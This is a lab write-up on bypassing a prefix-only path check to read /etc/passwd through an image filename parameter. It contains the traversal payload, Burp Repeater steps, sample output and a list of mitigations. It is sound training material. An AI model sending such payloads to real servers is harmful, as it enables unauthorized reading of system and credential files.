# Lab: File Path Traversal - Validation of Start of Path

## Overview
This lab is vulnerable to a file path traversal attack. The application validates that the requested file path starts with the expected base directory, but fails to properly sanitize traversal sequences afterward.

## Objective
Exploit the path traversal vulnerability and retrieve the contents of the `/etc/passwd` file.

## Tools Used
- Burp Suite (Proxy, HTTP History, Repeater)
- Browser (Firefox)

## Vulnerability Explanation
The application loads image files using requests such as:

```bash
/image?filename=/var/www/images/5.jpg
```

The server validates that the path begins with:

```bash
/var/www/images/
```

However, the application does not properly handle traversal sequences appearing after the validated path.

Payload used:

```bash
/var/www/images/../../../etc/passwd
```

Explanation:

- The request starts with the allowed directory:
  
```bash
/var/www/images/
```

- The traversal sequences:

```bash
../../../
```

move outside the intended directory and access sensitive system files.

Final resolved path:

```bash
/etc/passwd
```

This successfully bypasses the validation mechanism.

## Steps to Reproduce

1. Open the lab in the browser.
2. Turn ON Burp Suite Proxy.
3. Visit any product page.
4. Go to **HTTP History** in Burp Suite.
5. Locate the image request:

```bash
GET /image?filename=/var/www/images/5.jpg
```

6. Right-click the request → **Send to Repeater**.
7. Modify the request parameter to:

```bash
GET /image?filename=/var/www/images/../../../etc/passwd
```

8. Click **Send**.
9. Observe the response from the server.

## Proof of Concept

The server responds with contents of the `/etc/passwd` file:

```bash
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
...
```

This confirms successful exploitation of the path traversal vulnerability.

## Payload Used

```bash
/var/www/images/../../../etc/passwd
```

## Impact

- Unauthorized access to sensitive files
- Disclosure of usernames and system information
- Potential server compromise
- Increased risk of further attacks

## Mitigation

- Normalize file paths before validation
- Validate the final resolved path, not just the prefix
- Restrict file access to intended directories only
- Reject traversal sequences (`../`)
- Use secure file handling APIs

## Key Learnings

- Learned how path prefix validation can be bypassed
- Understood the importance of path normalization
- Practiced exploiting traversal vulnerabilities using Burp Repeater
- Improved understanding of insecure file validation mechanisms
